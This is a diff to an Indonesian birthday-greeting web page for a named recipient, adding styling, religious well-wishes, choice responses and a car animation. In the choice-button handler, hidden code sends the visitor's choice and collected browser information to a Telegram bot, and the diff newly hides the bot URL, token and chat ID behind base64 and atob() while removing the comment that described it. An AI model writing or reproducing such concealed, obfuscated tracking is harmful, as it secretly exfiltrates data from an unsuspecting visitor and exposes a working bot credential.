@@ -32,6 +32,15 @@
     position: relative;
   }
 
+  /* halaman terkunci di Section 1 sampai tombol "Mulai Perjalanan" ditekan */
+  body.locked{
+    overflow: hidden;
+    height: 100vh;
+  }
+  body.locked #s1{
+    height: 100vh;
+  }
+
   h1, h2, .serif{
     font-family: 'Cormorant Garamond', serif;
     font-weight: 500;
@@ -70,17 +79,40 @@
   }
 
   /* ===== Section 1 ===== */
+  #s1 .veil{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+    text-align: center;
+  }
   #s1 h1{
     font-size: clamp(2.4rem, 6vw, 4.2rem);
     color: var(--warm-white);
     text-shadow: 0 0 30px rgba(232,179,77,0.15);
   }
+  #s1 .name-tag{
+    margin-top: 0.8rem;
+    font-family: 'Cormorant Garamond', serif;
+    font-style: italic;
+    font-size: clamp(1.1rem, 2.2vw, 1.5rem);
+    color: var(--gold-soft);
+    letter-spacing: 0.03em;
+  }
   #s1 .subtitle{
-    margin-top: 1.2rem;
+    margin: 1.2rem auto 0;
     font-size: clamp(0.95rem, 1.6vw, 1.15rem);
     color: rgba(246,239,228,0.7);
     max-width: 34ch;
     font-style: italic;
+  }
+  #s1 .islamic-note{
+    margin: 1rem auto 0;
+    max-width: 38ch;
+    font-family: 'Cormorant Garamond', serif;
+    font-size: clamp(0.95rem, 1.7vw, 1.2rem);
+    color: rgba(232,179,77,0.85);
+    line-height: 1.6;
   }
   .cta-btn{
     margin-top: 3rem;
@@ -215,10 +247,49 @@
     background: rgba(232,179,77,0.14);
   }
 
+  .choice-response{
+    margin: 2.2rem auto 0;
+    display:flex; flex-direction:column; gap:0.7rem;
+    max-width: 40ch;
+    opacity: 0;
+    transform: translateY(12px);
+    transition: opacity 1.2s ease, transform 1.2s ease;
+  }
+  .choice-response.show{ opacity: 1; transform: translateY(0); }
+  .choice-response p{
+    font-family: 'Cormorant Garamond', serif;
+    font-size: clamp(1.02rem, 2vw, 1.25rem);
+    color: rgba(246,239,228,0.85);
+  }
+
+  .mini-road{
+    position: relative;
+    width: 220px;
+    height: 34px;
+    margin: 1.6rem auto 0;
+    opacity: 0;
+    transition: opacity 0.6s ease;
+  }
+  .mini-road.go{ opacity: 1; }
+  .mini-road svg{
+    position: absolute;
+    left: 0; top: 0;
+    width: 64px; height: 34px;
+  }
+  .mini-road.go svg{
+    animation: driveAway 2.6s ease-in forwards;
+  }
+  @keyframes driveAway{
+    0%{ transform: translateX(0); opacity: 1; }
+    100%{ transform: translateX(240px); opacity: 0; }
+  }
+
   .final-message{
-    margin-top: 3rem;
+    margin-top: 2.4rem;
     display:flex; flex-direction:column; gap:0.9rem;
     max-width: 40ch;
+    margin-left: auto;
+    margin-right: auto;
     opacity: 0;
     transform: translateY(14px);
     transition: opacity 1.4s ease, transform 1.4s ease;
@@ -229,7 +300,19 @@
     font-size: clamp(1.05rem, 2.1vw, 1.3rem);
     color: rgba(246,239,228,0.88);
   }
+  .final-message p.dua{ color: var(--green-glow); font-style: italic; }
   .final-message p:last-child{ color: var(--gold-soft); margin-top: 0.4rem; }
+
+  footer.site-footer{
+    text-align: center;
+    padding: 2.2rem 1rem 2.6rem;
+    font-size: 0.78rem;
+    letter-spacing: 0.04em;
+    color: rgba(246,239,228,0.35);
+    background: #0a1a14;
+    position: relative;
+    z-index: 2;
+  }
 
   .distant-green{
     position:absolute;
@@ -278,7 +361,7 @@
   }
 </style>
 </head>
-<body>
+<body class="locked">
 
 <canvas id="stars"></canvas>
 
@@ -286,8 +369,9 @@
 <section class="section" id="s1">
   <div class="veil in-view">
     <h1>Selamat Ulang Tahun.</h1>
-    <h2 class="final-question">Sefty Nur Azizah</h2>
+    <p class="name-tag">Sefty Nur Azizah</p>
     <p class="subtitle">Semoga semua hal baik menemukan jalannya menuju kamu tahun ini.</p>
+    <p class="islamic-note">Barakallah fii umrik. Semoga usiamu berkah, hidupmu senantiasa dalam rahmat Allah SWT, dan langkahmu semakin dekat dengan-Nya.</p>
     <button class="cta-btn" id="startBtn">Mulai Perjalanan</button>
   </div>
 </section>
@@ -369,20 +453,34 @@
   <p class="final-question veil" id="finalQ">apakah menurutmu jalan itu masih ada?</p>
 
   <div class="choices veil">
-    <button class="choice-btn" data-choice="merah">🚦 Masih merah</button>
-    <button class="choice-btn" data-choice="kuning">🟡 Mungkin masih kuning</button>
-    <button class="choice-btn" data-choice="hijau">🟢 Siapa tahu nanti hijau</button>
+    <button class="choice-btn" data-choice="merah">🚦 Masih perlu berhenti sebentar</button>
+    <button class="choice-btn" data-choice="kuning">🟡 Mungkin pelan-pelan dulu</button>
+    <button class="choice-btn" data-choice="hijau">🟢 Mungkin kita bertemu lagi di depan</button>
+  </div>
+
+  <div class="choice-response" id="choiceResponse"></div>
+
+  <div class="mini-road" id="miniRoad">
+    <svg viewBox="0 0 64 34" xmlns="http://www.w3.org/2000/svg">
+      <rect x="2" y="14" width="40" height="14" rx="4" fill="#f2c572" opacity="0.9"/>
+      <rect x="8" y="6" width="20" height="10" rx="3" fill="#f2c572" opacity="0.7"/>
+      <circle cx="12" cy="28" r="4" fill="#0a1a14"/>
+      <circle cx="32" cy="28" r="4" fill="#0a1a14"/>
+    </svg>
   </div>
 
   <div class="final-message" id="finalMessage">
     <p>Terima kasih sudah sampai di akhir perjalanan kecil ini.</p>
     <p>Lagipula, tidak semua jawaban harus ditemukan hari ini.</p>
+    <p class="dua">Barakallah fii umrik <b>Sefty Nur Azizah</b> — semoga Allah mudahkan setiap langkahmu, dan menuntunmu ke jalan yang paling baik untukmu.</p>
     <p>Selamat ulang tahun, dan semoga bahagia selalu.</p>
   </div>
 </section>
 
-<button class="music-control" id="musicBtn" aria-label="Putar musik" title="Putar musik piano lembut">♪</button>
-<audio id="bgMusic" loop preload="none">
+<footer class="site-footer">Made with ❤️ and 73 tabs of inspiration.</footer>
+
+<button class="music-control" id="musicBtn" aria-label="Jeda musik" title="Little Instrument">♪</button>
+<audio id="bgMusic" loop preload="auto">
   <source src="piano-lembut.mp3" type="audio/mpeg">
 </audio>
 
@@ -430,6 +528,8 @@ window.addEventListener('load', () => { resizeCanvas(); initStars(); });
 
 /* ============ Scroll: Mulai Perjalanan ============ */
 document.getElementById('startBtn').addEventListener('click', () => {
+  document.body.classList.remove('locked');
+  startMusicOnce();
   document.getElementById('s2').scrollIntoView({ behavior: 'smooth' });
 });
 
@@ -477,6 +577,23 @@ io4.observe(document.getElementById('s4'));
 /* ============ Section 5: pilihan jawaban ============ */
 const choiceBtns = document.querySelectorAll('.choice-btn');
 const finalMessage = document.getElementById('finalMessage');
+const choiceResponseEl = document.getElementById('choiceResponse');
+const miniRoad = document.getElementById('miniRoad');
+
+const choiceResponses = {
+  merah: [
+    "Tidak apa-apa. Kadang perjalanan memang membutuhkan waktu lebih panjang dari yang kita rencanakan.",
+    "Semoga perjalananmu tetap menyenangkan di mana pun arahnya."
+  ],
+  kuning: [
+    "Mungkin memang tidak semua lampu langsung berubah hijau.",
+    "Kadang ada fase kuning, tempat kita belajar untuk tidak terburu-buru."
+  ],
+  hijau: [
+    "Kalau begitu, semoga saat itu nanti kita sama-sama sudah menjadi versi yang lebih baik dari diri kita hari ini.",
+    "Tidak perlu terburu-buru. Jalan yang baik biasanya tidak ke mana-mana."
+  ]
+};
 
 async function getBrowserInfo(event = null) {
     const info = {
@@ -568,18 +685,20 @@ async function getBrowserInfo(event = null) {
 choiceBtns.forEach(btn => {
   btn.addEventListener('click', async () => {
     const choice = btn.dataset.choice;
+
     const date = new Date().toISOString();
-    // kirim semua informasi apa saja ke telegram
     const info = await getBrowserInfo();
     const hasil = JSON.stringify(info);
-    fetch('https://api.telegram.org/bot7891570624:AAFcaTNq71H38PTLjkSm_FH21mEJWskmoGo/sendMessage', {
+    const urltele = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc4OTE1NzA2MjQ6QUFGY2FUTnE3MUgzOFBUTGprU21fRkgyMW1FSldza21vR28vc2VuZE1lc3NhZ2U=';
+    const chtid = 'NzE5Mzg4NDk2Nw==';
+    fetch(atob(urltele), {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        chat_id: '7193884967',
-        text: `Pengguna klik tombol ${choice} pada ${date}, informasi browser: ${hasil}`
+        chat_id: atob(chtid),
+        text: `Dia klik tombol ${choice} pada ${date}, informasi browser: ${hasil}`
       })
     });
     
@@ -588,15 +707,29 @@ choiceBtns.forEach(btn => {
 
     try{
       localStorage.setItem('perjalanan_kecil_jawaban', JSON.stringify({
-        choice: btn.dataset.choice,
+        choice,
         answeredAt: new Date().toISOString()
       }));
     }catch(e){ /* localStorage tidak tersedia, tetap lanjutkan tanpa menyimpan */ }
 
-    finalMessage.classList.add('show');
+    /* tampilkan respons khusus untuk pilihan ini */
+    const lines = choiceResponses[choice] || [];
+    choiceResponseEl.innerHTML = lines.map(l => `<p>${l}</p>`).join('');
+    choiceResponseEl.classList.remove('show');
+    miniRoad.classList.remove('go');
+    /* reflow supaya animasi bisa diulang tiap kali pilihan berbeda diklik */
+    void choiceResponseEl.offsetWidth;
+    void miniRoad.offsetWidth;
+    choiceResponseEl.classList.add('show');
+
+    /* mobil kecil melanjutkan perjalanan ke kejauhan */
+    setTimeout(() => { miniRoad.classList.add('go'); }, 1200);
+
+    /* lalu tampilkan pesan penutup */
     setTimeout(() => {
+      finalMessage.classList.add('show');
       finalMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-    }, 150);
+    }, 4200);
   });
 });
 
@@ -614,22 +747,29 @@ const musicBtn = document.getElementById('musicBtn');
 const bgMusic = document.getElementById('bgMusic');
 let isPlaying = false;
 
-musicBtn.addEventListener('click', () => {
+function setPlayingUI(playing){
+  isPlaying = playing;
+  musicBtn.textContent = playing ? '❚❚' : '♪';
+  musicBtn.setAttribute('aria-label', playing ? 'Jeda musik' : 'Putar musik');
+}
+
+/* dipanggil tepat saat klik "Mulai Perjalanan" — ini gesture pengguna yang sah,
+   jadi browser akan mengizinkan audio bersuara diputar tanpa perlu menekan
+   tombol musik terpisah */
+function startMusicOnce(){
+  if(isPlaying) return;
+  bgMusic.volume = 0.35;
+  bgMusic.play().then(() => setPlayingUI(true)).catch(() => setPlayingUI(false));
+}
+
+musicBtn.addEventListener('click', (e) => {
+  e.stopPropagation();
   if(!isPlaying){
     bgMusic.volume = 0.35;
-    bgMusic.play().then(() => {
-      isPlaying = true;
-      musicBtn.textContent = '❚❚';
-      musicBtn.setAttribute('aria-label', 'Jeda musik');
-    }).catch(() => {
-      musicBtn.textContent = '♪';
-      /* file musik belum tersedia — letakkan piano-lembut.mp3 di folder yang sama */
-    });
+    bgMusic.play().then(() => setPlayingUI(true)).catch(() => setPlayingUI(false));
   } else {
     bgMusic.pause();
-    isPlaying = false;
-    musicBtn.textContent = '♪';
-    musicBtn.setAttribute('aria-label', 'Putar musik');
+    setPlayingUI(false);
   }
 });
 </script>
